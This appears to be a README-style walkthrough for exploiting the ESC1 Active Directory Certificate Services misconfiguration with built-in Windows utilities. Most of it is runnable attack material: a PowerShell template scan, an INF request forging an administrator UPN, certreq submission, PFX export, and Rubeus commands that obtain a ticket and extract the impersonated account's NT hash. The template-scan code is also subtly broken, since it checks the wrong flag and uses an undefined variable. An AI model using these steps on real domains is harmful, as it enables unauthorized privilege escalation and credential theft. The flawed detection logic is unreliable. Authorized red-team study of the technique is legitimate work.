# ESC1_Build_In_Script

This script is designed to assist penetration testers and Red Teamers in conducting security assessments.

When operating in "live infrastructure," leveraging automation tools signed by native security and control mechanisms within Active Directory environments can introduce challenges, as these tools are tightly integrated with domain infrastructure.

In this guide, I will demonstrate how to exploit the ESC1 vulnerability in an Active Directory environment with Active Directory Certificate Services (ADCS). This will be achieved without relying on third-party tools, using only built-in Windows utilities.

The process includes:

Identifying a vulnerable certificate template configured with misconfigurations that allow unauthorized certificate enrollment.
Requesting a certificate on behalf of any user in the domain by exploiting the identified vulnerable template.
Utilizing the certificate for impersonation to escalate privileges or access restricted resources.
This demonstration highlights the importance of proper certificate template hardening and serves as a practical guide to understanding the risks associated with improperly secured ADCS implementations.

This guide is intended for authorized security assessments only. Unauthorized use or actions without proper consent may violate laws and regulations. Always ensure you have explicit permission before conducting such activities.

Enjoy learning and, most importantly, stay safe!

## **Step-by-Step Instructions**

### 1. **Find The Vulnerable Templates:**
```
$templateBlocks = $templates -split "Template\["

foreach ($block in $templateBlocks) {

    if ($block -match "TemplatePropCommonName = (.+)") {
        $templateName = $matches[1]
    } else {
        continue
    }


    $hasClientAuth = $block -match "1\.3\.6\.1\.5\.5\.7\.3\.2"


    $hasSupplyInRequest = $block -match "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"


    $hasEnrollPermissions = $block -match "Allow Enroll.*Authenticated Users" -or $block -match "Allow Enroll.*Domain Users"

    if ($hasClientAuth -and $hasSupplyInRequest -and $hasEnrollPermissions) {
        Write-Output "Template: $templateName"
        Write-Output "  - Client Authentication EKU Found"
        Write-Output "  - Supply in Request Found"
        Write-Output "  - Enroll Permission for Authenticated Users or Domain Users Found"
        Write-Output ""
    }
}
```

### 2. **Create an INF file**
```ini
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN=administrator, OU=Users, DC=shkud, DC=local" 
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "dns=shkud.local&upn=administrator@shkud.local"
```

Change the Subject record to the Distinguished Name (DN) of the user account you want to impersonate:
```
Subject = "CN=administrator, OU=Users, DC=shkud, DC=local"
```

Additionally, update the continue record as well:
```
_continue_ = "dns=shkud.local&upn=administrator@shkud.local"
```

### 3. **After creating the INF file, generate a CSR file using the following command:**
```
certreq -new My_request.inf My_request.csr
```

### 4. **Next, submit the CSR to the CA server, specifying the desired certificate template, and save the issued certificate:**
```
certreq -submit -attrib "CertificateTemplate:My_Template" My_request.csr My_Cert.cer
```

### 5. **Finally, accept and install the issued certificate using the following command:**
```
certreq -accept My_Cert.cer
```

### 6. **Next, locate the Thumbprint of the certificate by running the following command:**
```
Get-ChildItem Cert:\CurrentUser\My
```

### 7. **Afterward, generate a PFX file by executing the following commands:**
```
$password = ConvertTo-SecureString -String '1qaz!QAZ' -AsPlainText -Force
Export-PfxCertificate -Cert Cert:\CurrentUser\My\5440925da4167c5f92cd9cf66a4f68622f63e1c7 -FilePath administrator.pfx -Password $password
```

### 8. **Now, with the PFX file, you can use Rubeus to request a TGT (Ticket Granting Ticket) using the certificate. Execute the following command:**
```
.\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:1qaz!QAZ /dc:dc.shkud.local /domain:shkud.local /ptt
```

Of course, since we're working with the PKINIT protocol, we can exploit the use of the User-to-User (U2U) mechanism. This allows us to request a TGS (Ticket Granting Service) for a service that belongs to ourselves (yes, it sounds strange, but it works).

The TGS ticket we receive will include a PAC (Privilege Attribute Certificate), and within that PAC, we can extract the NT Hash of the user account we impersonated.

Just add the /getcredentials flag with the rubeus tool:
```
.\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:1qaz!QAZ /dc:dc.shkud.local /domain:shkud.local /getcredentials
```
